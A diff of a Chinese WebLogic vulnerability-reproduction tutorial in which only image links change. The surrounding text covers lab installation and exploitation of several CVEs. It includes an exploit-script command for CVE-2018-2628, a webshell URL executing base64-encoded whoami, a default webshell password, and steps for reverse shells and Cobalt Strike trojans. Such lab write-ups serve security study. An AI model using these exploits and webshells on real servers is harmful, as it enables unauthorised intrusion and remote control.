@@ -87,7 +87,7 @@ Weblogic 是美国 Oracle 公司出品的应用服务器软件，确切的说这
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibCicQVVr2SNdRfbDz2Xw7dhj6e9vXaic3o29hxAZORwHQ5Wiar0ibLNAp8A/640?wx_fmt=png)
+![](../../.resource/remote/50e359d8509036d6a5ecbab1d9dc958828930d9a9733ada74e71f62ea2e258e3.png)
 
 Weblogic 最新的版本需要 jdk1.8 以上，如果 jdk 版本为 1.8 以下，可能会出现无法安装的情况。经过测试 weblogic 版本为 12.1.3 可在 jdk 1.7 版本下可以安装。而 weblogic 版本为 10.3.6 及以下可在 jdk 1.6 版本下可以安装。
 
@@ -95,79 +95,79 @@ Weblogic 最新的版本需要 jdk1.8 以上，如果 jdk 版本为 1.8 以下�
 
 在官网下载模块中选择一个版本进行下载
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibnkrdcRuHgjxwN4hst4z13YKruultibOeOZ7URNufTel9ZPMWknKOOpw/640?wx_fmt=png)
+![](../../.resource/remote/a9be542bbdb40acfaac802387989089c30460994a9c8c1e9c4a0ce48706dc399.png)
 
 我选择的是 10.3.6 的 Generic 版本
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibCKcllUTPk5hXFRuqmx8q8WyAr76TAGdArLECzW7ib12kwFqoZVKribww/640?wx_fmt=png)
+![](../../.resource/remote/1ad70eb6ed860620f582096d914dbade9ec02a8940a18c6ccbbb8c6cf43654e5.png)
 
 1、开始安装 weblogic，直接开始下一步
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibYvLUJxXD7qhgG1RtjkAsOd9QYFquViaGtXGYEsQLicGAq6jByyMl3trw/640?wx_fmt=png)
+![](../../.resource/remote/f36cb10f32fb86774c0603f011e62bff6bdb8081ac45e6c5a5e3bf14c02d143a.png)
 
 2、选择典型进行安装
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibyediaoNQryTb9tNIz7kf9fLXETZUBnM2ZvJ9IF5KIqXDmSrga4I34pw/640?wx_fmt=png)
+![](../../.resource/remote/fbf7696e91db9ae618d38a87ccdcaa8de922d77c393aee122d0de02f66dc90f1.png)
 
 3、查看相关概要后继续下一步
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibknA2wx8A64KXMibTqaT86CY3Bcnrial3LWJmcaxNBSVO6f7oGF8lxkNw/640?wx_fmt=png)
+![](../../.resource/remote/ce43eedab47043cb88e32ad94b0bad1d76bd0cd0c4209ecf1f361011d1618d9c.png)
 
 4、安装完成 weblogic
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibXmDC8sbQPAD0vP49yicWKibpjtshYKzz8a4EyDIebhJxGC7QJEn2PveA/640?wx_fmt=png)
+![](../../.resource/remote/fbc12e729c035d160795601edf70b843ff4154f67ebbd80ba73ab8904231dacc.png)
 
 5、点击开始 weblogic server
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibr2LIIDBibbp0oYNpq6yUKlheVbBh1w4UwqePspBxv8rFSYNpz2uwjJw/640?wx_fmt=png)
+![](../../.resource/remote/983f3d1b51aec5e51b72059ef314192bba42b8bca8c9e9a9906d69128647389f.png)
 
 6、创建新的 weblogic 域
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibmkCEdp93qicUGnHF07xGm0KRnlHwojKnhjrskJkB1Xlia7Ud0MVouNCA/640?wx_fmt=png)
+![](../../.resource/remote/c5de21a58ea2cc644dbc6d14e9e5e5a653ae0eaa7e8f36aa726d16569a1bffdc.png)
 
 7、生成自动配置的 weblogic 域，点击下一步
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibicyDqVJicgRBCd928Fc5oszIU31n2e4pJT9PO39QjXQoT2WEAGdibLj8w/640?wx_fmt=png)
+![](../../.resource/remote/e060dc22bce9becde716eb33e4685ceb05daa6d40115e19a6c5b4c836de1dd70.png)
 
 8、选择默认的域名和域位置即可
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib3zLHuQ9AVFdykHibiaTk9kU0UfhJqH8ib2aSzIs51MznB38jWjOwZQrug/640?wx_fmt=png)
+![](../../.resource/remote/ebe4506461b5a6c0f5756813bc05a7dfa48eb0c8f078c75f3418306347479157.png)
 
 9、设置账号密码为 weblogic/admin123.  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib6rmSpggkMyCibj48oxtqV5jGr6W5kiaPSy3wNyicZ4yWQugWZy4Q4GfCw/640?wx_fmt=png)
+![](../../.resource/remote/fe4fef152aed5d40f4e6212266877f8c14ef674e8a564e041306512a2f40286a.png)
 
 10、选择开发默认，并制定可用的 jdk 版本
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib0ibd7eMWZrtCZrqkWgFiaKoFwM3pvibruwWq9s5aOaA32kzKCA5ficvucg/640?wx_fmt=png)
+![](../../.resource/remote/8330375048796a3bf553004136807157f702e8e907947d1958b6838e40ea11ca.png)
 
 11、点击管理服务器和受管服务器、集群和计算机
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibiaggYYKMW5Q44LTibhgaW8LS6eHR90eLqNMLDmpVBLicSZoGjk37CCe8w/640?wx_fmt=png)
+![](../../.resource/remote/e0b14f0e85541431995a89e4f8dc76faa97e9e4b899525fb5e0bd02f0be256bc.png)
 
 12、访问端口和网络都为默认配置
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibWEBf0oNCceKfqV0rFJHLINzwB3RsAcSIicL8hsNpUB2IvIFDExNBNUw/640?wx_fmt=png)
+![](../../.resource/remote/1cb856d543b3137f3c7342d1e60d8270b5c23da912247a60592770d1cc98d345.png)
 
 13、之后安装完成
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibQ0ibFMbAelfsp7EgdCwqGxIrdeAv6m5uY5rT6SGtfvZGd37w7gN6ibxA/640?wx_fmt=png)
+![](../../.resource/remote/8754f7e895109517e5745b7efcb3ced31abc1faba05b3af12a802f3c77fd594f.png)
 
 14、找到启动 cmd 文件，点击开启 Weblogic
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibKekMlTiaoAicRQCAhMGoURcduuKIHfILfvqQTps2Ybn2kLic8fF9EEL8Q/640?wx_fmt=png)
+![](../../.resource/remote/7058380178c250dc7fa9473e95880e883c207e702709c471fa438b3148465c7c.png)
 
 15、填入账号密码后成功开启 Weblogic
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibVVUP7ibDibjQ8I8oXdYvAw0cbVLh0FnYCUgT1Zn0Q4hGq94Q2RXNcUUg/640?wx_fmt=png)
+![](../../.resource/remote/1601e98d1a014772b6f0abd7e372344bd562fe01712ef5f4d295e84bb7bcd362.png)
 
 16、访问 http://192.168.0.105:7001/，开启成功
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibEcVoXykBibnl9Ds4Po14OQQJxhLsFibQTv3voPG1MZZKak9oK4OUQf5g/640?wx_fmt=png)
+![](../../.resource/remote/c5b9d30e3634ed891e6e7a56858e79552358494bfaef37ff5aec0141dfa5a411.png)
 
 控制台地址为 http://192.168.0.105:7001/console/
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibCNl09WPaVb6IgnOSRHQfvYib6C7ZVWFBAK8Lj1DJvgCrw94rCOuCxpA/640?wx_fmt=png)
+![](../../.resource/remote/bdac12634c59abcf966535c372cb3492f011811c41ca5043eabe26e8e199d989.png)
 
 **weblogic 12.1.3 安装**
 
@@ -178,59 +178,59 @@ java -jar fmw_12.1.3.0.0_wls.jar
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibm1kDJaPzDpia2CvvepDjNgMgpLAVNk17kHiatWjsyeibgYh9RheMBOz7A/640?wx_fmt=png)
+![](../../.resource/remote/8f6858097a62b02f37552f6e0efb0a4e8f673d200326acbf6c4ba314f2af0217.png)
 
 如果执行报错，是因为 Windows 默认会使用 jre 环境，而不是 jdk 环境，可将其放置到 jdk 环境下再运行
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibiaT33PaR3PmYQJBzqFyZVEYdKuSE5JR1XEGicAoOamQwqO8ppr7VWcew/640?wx_fmt=png)
+![](../../.resource/remote/b5ff8b21910e036990d5e7e3cac0d25c32ae4c3b93225d4cbd9cb2443a4d63a6.png)
 
 1、开始安装 Weblogic
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibib1QtCOch3cwZ9Y8FEAuCxmw0cOSqXunR2jLZwSiaBykWpjgLxeQUjbQ/640?wx_fmt=png)
+![](../../.resource/remote/610cd4bf86eeaf8f0b9ba02d31f0dd5598316e366c91e84d97de2584f85f507b.png)
 
 2、一直下一步到此点击安装完成 
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibSzr8EU4p9Yb3R178dlJGxibTJLznNgWIg1KjIvIpneOvpfEpNicKpvBA/640?wx_fmt=png)
+![](../../.resource/remote/db0fe377982c30aac4309b932491b56fff20ae3f089046ac030e2f5feebf9397.png)
 
 3、开始配置 Weblogic 域 
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibRhmY9jZ8TnqK4Pt620FNKMK9u1axqjbBRELFmRr2qYDWqoPhu5uqAg/640?wx_fmt=png)
+![](../../.resource/remote/767c033120ca95a442bd308ca4685aacf80e2a51d8d36904b386ea821bbe4c59.png)
 
 4、设置账号密码为 weblogic/admin123. 
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibsJZciclISPrKqcicWTQ2l5NhMPXM0lrNGK4biagQ4RAl6N21JeulKsP0Q/640?wx_fmt=png)
+![](../../.resource/remote/7c307feeb19b599509b2dfa5a2e4b41a324bcffbd823d6b65a9128ab00b7886b.png)
 
 5、选择生产模式 
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibvYia5z7INr2otlBPNTXUHXKwibzIQn1O5mzcf7icIxIibrKiaLiblknyhPibw/640?wx_fmt=png)
+![](../../.resource/remote/04853e556d45c438382c63e54600184f5c34fcee7d640ed3f5f6f341b653a352.png)
 
 6、配置节点管理器和管理服务器 
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibG9ykrNU96yjKgIuf65o7IsjJf60gOQKicPsQialWevQoWDRx3SmYBnWQ/640?wx_fmt=png)
+![](../../.resource/remote/9acc2e8f84ccd3cd20c05ca74146f13925f63e6baa7d4efb490db84b47ff2bb1.png)
 
 7、选择默认管理服务器配置 
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibFVnXfO2T2q5ibmLglPuu4ibBCpWN3BO3cLteVKGUibw0eicq9kibO4Yraw/640?wx_fmt=png)
+![](../../.resource/remote/d3456548615e9b83d8cddd614b36ed583e6d6bec5a6530660ac97e560e251e0d.png)
 
 8、一直下一步即可安装完成 
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibUuIGDaMNmoDTJsT0kCgXcgw02hj9YONcrYiaicK93ia3WnJictL1CNooRg/640?wx_fmt=png)
+![](../../.resource/remote/4ba50421b8bd8957ebf22f9bb7e7d1031bde87bc03bdb73cecad8381fd560b92.png)
 
 9、找到启动 cmd 文件，点击后开启 Weblogic 
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibq37cWBCDfa4mFWGN2ONrNeOZTFQ291NdnXq3eXeCSFrB3Nn4Wics4LA/640?wx_fmt=png)
+![](../../.resource/remote/a30d46340a0bd61db13f81e58f81a7d416f6ff223ef1e97334ad24e27cfe7540.png)
 
 10、运行需输入之前的账号密码 
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib4Hqn2uXla0y6uW4mUJSDAoLxYhtTr0oMC8qlZIwPUApEhr82srHSDg/640?wx_fmt=png)
+![](../../.resource/remote/da8603ca9844ecedf8d0f687b39c1bf2aae9637b6eb2e7db44120fdebe4bddeb.png)
 
 11、访问 http://192.168.0.111:7001/，开启成功
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibQuZ7KaicZEwjkunarEWUHYsN2Q1h1Gm3cHqMDwFARtp326CHcQjLTdw/640?wx_fmt=png)
+![](../../.resource/remote/1d2e98384d7b7ebbf4c3d9d310d4eef0a9467c674199e11faa8a1228dd404e39.png)
 
 12 版本的控制台界面与 10 版本也略有不同，在渗透时可轻易分辨
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibvibjWjy7WkKdKEYUKVY5PIBWhgzAiaQhXBns2aPBbfcuGgESicyMCKvUw/640?wx_fmt=png)
+![](../../.resource/remote/754cdd8066fd9c86614fde30b4073d2d60c2dbc8557a3cbfdb527d9c6028018c.png)
 
 ### **0x03 **Weblogic 漏洞复现****
 
@@ -244,13 +244,13 @@ Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了
 
 访问 http://192.168.0.105:7001/wls-wsat/CoordinatorPortType 验证漏洞是否存在，访问成功说明漏洞可能存在
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibbAEIktQ00OH3O5RlSu7JGcjQ1BEbuToZYc1nmQ7WKHS9wOtISc9COg/640?wx_fmt=png)
+![](../../.resource/remote/4ca643bfdf447e95c43cb30c43702472c874c9073682087aa1ff41e3f6d61a96.png)
 
 该漏洞不仅存在于 / wls-wsat/CoordinatorPortType 中，只要是在 wls-wsat 包中的 URI 均受到影响在 web.xml 可找到所有受影响的 URL 路径。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibZZm7wke0SnC5gemVeM95lwsRaibMs9RKZxNVPwPPN6xibz7gicYXSFfg/640?wx_fmt=png)
+![](../../.resource/remote/efc2ad7ab28728d4ba5c1cecd3b9fe127c5d574d34dce4d30d53b16c9d87b590.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibZZm7wke0SnC5gemVeM95lwsRaibMs9RKZxNVPwPPN6xibz7gicYXSFfg/640?wx_fmt=png)
+![](../../.resource/remote/efc2ad7ab28728d4ba5c1cecd3b9fe127c5d574d34dce4d30d53b16c9d87b590.png)
 
 经整理后受到影响的路径包括如下：
 
@@ -300,15 +300,15 @@ Content-Length: 642
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibNA34OpZ4JhPqAFJT8ehAN6LuXbZan6ghq8R6NT0sMQc50NwefLWOicw/640?wx_fmt=png)
+![](../../.resource/remote/105903ae6867db822728964b6e00163dcd03c81150bf81637e79e2828bac8707.png)
 
 访问 http://192.168.0.105:7001/bea_wls_internal/mac.jsp，成功输出 hello
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibLSdf8SorUiaHeO1uUERzVgbqIBkNv3wNhLMoKD9zdic1DFxopMaiaXiabw/640?wx_fmt=png)
+![](../../.resource/remote/26a1ee3677a0e763149dd18cf1da90ae6d17fdfb54cad3dd5bc7a8b0a81478be.png)
 
 同时在目标靶机中已存在该文件
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibKiaSpPObWiaHxVa5Xick2BDanTvmdHm5JN7waGVC34ltJceCict1EHl17w/640?wx_fmt=png)
+![](../../.resource/remote/268820b44fc6b42c4cffb3c76c9eb948792161d5a277e22beac0e242607abc7c.png)
 
 ```
 需要注意的是如果`Windows Defender`开启状态下，尽管文件存在，但是无法访问到写入的 jsp 文件
@@ -324,7 +324,7 @@ Content-Length: 642
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibVVQ1r6AzuuhpRXGKWwyZvhP0NhCI3LpOgauKdOlCMK2wEBNjAuTic9w/640?wx_fmt=png)
+![](../../.resource/remote/197b6151220078ec5b43138907ed69c5bb7a779d5491ca431113381c2edca796.png)
 
 **linux 反弹 shell**
 
@@ -372,17 +372,17 @@ Content-Length: 633
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibot7RSySBfb9DLPgJH1UeFu6ATqzgicRXLRsJaQxtFrJz19MfpNr9khg/640?wx_fmt=png)
+![](../../.resource/remote/f7d32b8b8b1ecfd5d9d572df22ae44e5fbffb2eb98889bf156095312314cef25.png)
 
 成功拿到反弹 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibH2Yno2B9kCaFz8LdcPvGUSsXF81iaUNvic3NffMbibOy5AP0wS4ER2qOw/640?wx_fmt=png)
+![](../../.resource/remote/7a178e74e2c12379505bc53ca1bfceaba8232d37ca0ea3c7e2b49d3065b98a07.png)
 
 **windows 上线 CS**
 
 在 CS 上生成 exe 类型木马
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibpwuLJqEHwZsTThlxR7jYX42U2saQljXTls6343BErqy9adHcJ61tEw/640?wx_fmt=png)
+![](../../.resource/remote/6ea1d07aa13179244e3783e29c403c3f09b091e78a252ecb9a20c4b44acef329.png)
 
 在本地开启 http 服务
 
@@ -427,11 +427,11 @@ Content-Length: 897
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibmkBia03W4Xv6CXnfXOR6v4diaXiaLQ47vEicdovLRffMIQe9iaibAbxk1O1A/640?wx_fmt=png)
+![](../../.resource/remote/663c4e10e291d310e83fee8a275a6913eaabb104e6916b18c03410738df713dc.png)
 
 成功上线 CS
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibbRZViabs4DxBbTTevRpH877VTPxFW1SVRUDoPtRViaLjqSzuib9Vp8JmQ/640?wx_fmt=png)
+![](../../.resource/remote/80402f32c3d2648fe6a199e62e76921e122a2d85148cd7bd3c86f1caca8758f4.png)
 
 针对 CVE-2017-3506 的补丁加了验证函数，具体是在 weblogic/wsee/workarea/WorkContextXmlInputAdapter.java 中添加了 validate 方法，以此来验证 payload 中的节点是否存在 object Tag，其源码如下：
 
@@ -511,7 +511,7 @@ https://www.oracle.com/security-alerts/cpuoct2017.html
 
 访问 /_async/AsyncResponseService 验证漏洞是否存在
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib6sibXeupYxg7A1iamzmSeeTb2bHpb00qYCVecicR6WpAxicVDeV3bNCaAg/640?wx_fmt=png)
+![](../../.resource/remote/a92808d68e743a7c421bd7c6ff6920378f46427d389bc178c0c16e663e739448.png)
 
 同样地该漏洞不仅存在于 /_async/AsyncResponseService 中，只要是在 bea_wls9_async_response 包中的 URI 均受到影响，在 web.xml 可找到所有受影响的 URL 路径。
 
@@ -520,7 +520,7 @@ C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibrmSExYcAvvibTD0iaQjjK7awlS8yBgPPNzTnoeSqicEK8euvqUCmO0zNQ/640?wx_fmt=png)
+![](../../.resource/remote/b1047c8f70d61cc332556d73f49e2783e296cadf8283b9bbf0557e2cb5e560b0.png)
 
 所有受影响的 URL 包括如下：
 
@@ -637,15 +637,15 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib5vdEOPOXNFEENAIclrLTPSckRyiawctyrsZZ0Nnnrq2iaZul47yJNshw/640?wx_fmt=png)
+![](../../.resource/remote/883229e98902da03996bcdf46385a970ffa3ab311956b4de9303e073c8d1e61c.png)
 
 访问 http://192.168.0.107:7001/bea_wls_internal/mac.jsp 发现木马已经存在，需要注意的是如果将其放在 bea_wls9_async_response/8tpkys/war 下则访问_async / 目录，如果放在 bea_wls_internal/9j4dqk/war 下则访问 bea_wls_internal / 目录
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibpujibzmMp9I1WxZsOlw8GnfMP4KtRPnXddVicQlHCIFhAQYaDtQib6yuQ/640?wx_fmt=png)
+![](../../.resource/remote/8bb0f93205d6f7e009afa49bfcde6611371f926ce364c5754ad7c0b805059d45.png)
 
 输入默认密码`Ninty`可进入管理
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibwVibhVdO4vZ8icaen8aAlG0Le4IeHAHibrHk1KPxDuU0icScLIjyDh9YgA/640?wx_fmt=png)
+![](../../.resource/remote/5c02f1b708501c2f66711d8d899d9d27340ea09c91f84bd33dc6f190e880ffcb.png)
 
 **linux 反弹 shell**
 
@@ -680,11 +680,11 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibbzCQAXibMuArliaNTX8LAomwAhTiaRF6RuL5er4WeQk6LyyzOSMEXJPiag/640?wx_fmt=png)
+![](../../.resource/remote/a234678e9337686268a9b179b6a5c3fbdf487874f77be198198325a63e1bd12e.png)
 
 成功拿到反弹 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibA3XXnwteicLFPXFDBGoia5qjAxEv9wNqCrGQorqib3Nag8avvTqn1DL2w/640?wx_fmt=png)
+![](../../.resource/remote/88c6e7542ab78df5469027bfb3225ac71dca1cb7a68a4ae64d1c571cb10fa8c5.png)
 
 **windows 上线 CS**
 
@@ -718,11 +718,11 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibvkeeBoxqgOKghzg43W9tvmVg2YvQ43INmvD0nYgAAs5RPNDoIw7Vew/640?wx_fmt=png)
+![](../../.resource/remote/ca48d833214be4a5a2e91f4029e9f142356b4487630e592bbd91edf172b4f808.png)
 
   成功上线 CS
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibbRZViabs4DxBbTTevRpH877VTPxFW1SVRUDoPtRViaLjqSzuib9Vp8JmQ/640?wx_fmt=png)
+![](../../.resource/remote/80402f32c3d2648fe6a199e62e76921e122a2d85148cd7bd3c86f1caca8758f4.png)
 
 **漏洞修复**
 
@@ -794,7 +794,7 @@ docker-compose up -d
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib7pFeZOLVUib186BKdbdgvibcEgu8ZqrVHmrDG6XudRmtC38OKVic3gzJA/640?wx_fmt=png)
+![](../../.resource/remote/9c4860145831b928ea045b70fbdd5560e83eb335fff05b6edad0c52dddd56b29.png)
 
 漏洞利用
 
@@ -805,7 +805,7 @@ python CVE-2018-2628-Getshell.py 192.168.0.102 7001 shell1.jsp
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibRpBR5XeMnj36YQ8BCwpchdIMoGHO6HqpDib1xibnRP2gxTicMroaeJkAA/640?wx_fmt=png)
+![](../../.resource/remote/3e3285b9b12ebb4179d094389ee525033ea86303160dc66155380fb52663b6f8.png)
 
 访问
 
@@ -814,19 +814,19 @@ http://192.168.0.107:7001/bea_wls_internal/shell1.jsp?tom=d2hvYW1pCg==，成功�
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibARmKXKlcicfbgpjDIcHuEHWiak4MADW1oOgj7iauDyQnezZgB2vC6BUBw/640?wx_fmt=png)
+![](../../.resource/remote/ff1226b86d50e9cfdefb5dd72db40717d930fa90a5b9ee60a0e878e1e7aae6da.png)
 
 其中的 d2hvYW1pCg== 为 base64 编码，解码后是 whoami 命令
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibSWgWz6HhOPDWmsTicLSxqmWtQ8guakCiboQO4aY6qj5HgVYGnCrzHNvw/640?wx_fmt=png)
+![](../../.resource/remote/4385343f38144a6b124b31733a84c3960c28f276f7359895789b971d4ed6541a.png)
 
 但是该工具只适合在 Linux 下执行，在 Windows 下执行能够直接上传文件，但访问会返回 500
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibdeCGJax0EU6I1oNiaVlzmVw5ymwx3knKiav7MV0ATeKrLic64kyK4Xb8w/640?wx_fmt=png)
+![](../../.resource/remote/b6e287d61dfdfcc288f5aa17068167c9ece4b5cd0be3f71c5dc9639a45d1246b.png)
 
 因此目标如果是 Windows，可利用 K8 工具来上传 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib4iajnob2eaerichA1C25jTbOvl0zqGuBibaXf3uChpAJt0EldqguyhtRg/640?wx_fmt=png)
+![](../../.resource/remote/37a7b9e94964959a9e607efc6a3002b4f05f3a84a7fe1c012bd3876eca44b8c3.png)
 
 利用脚本执行连接上传的 shell
 
@@ -836,7 +836,7 @@ python cve-2018-2628.py
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibejUR69R0qGx5xvAiaCFwqjvRcfIoEq8lLsr91wmiangTXYkWlcIOgCYw/640?wx_fmt=png)
+![](../../.resource/remote/fa7ef0ef0fb15b3e908c6ef79cf68d48a8b00b934ab004784c1071d40e97b345.png)
 
 **漏洞修复**
 
@@ -862,55 +862,55 @@ WebLogic 管理端未授权的两个页面存在任意上传文件漏洞，利�
 
 访问 Windows 下搭建的 Weblogic 12 版本，输入账号密码后可登录后台管理界面
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibFhNZWDqLKD7bzn1rEQux1oC5tVnntl8Dls8H1RmnT9AFxRyNzGelJg/640?wx_fmt=png)
+![](../../.resource/remote/7687e84cc89d3c57b83cb78c378edb0ca281bc8d0dbcb55fb373685930c1b515.png)
 
 在后台中未发现 / ws_utc/begin.do 和 / ws_utc/config.do 这两个界面，需要在配置中开启 web 服务测试页后才能够访问，点击保存并激活更改后重启 Weblogic
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib38SIXqhAq0CEGbGeolpCbjNicAIcb4bI7LmbW0LUAiaC7waAYe1zbRBQ/640?wx_fmt=png)
+![](../../.resource/remote/79780a641dd0c97dd309988d2c1834cce2039755f7e615d6a0c64360b790cab1.png)
 
 重启完成后成功访问界面 / ws_utc/begin.do，但仍然需要身份验证，这是生产模式和开发模式的区别，输入账号密码后进入 web 测试页面，其中没有文件上传口，说明生产模式下不存在该漏洞
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAiboTCZv91ePJZRHZvpVCicuVcqcib6ZloTkDZ8utNwt0zXQzC6DJMhvvoA/640?wx_fmt=png)
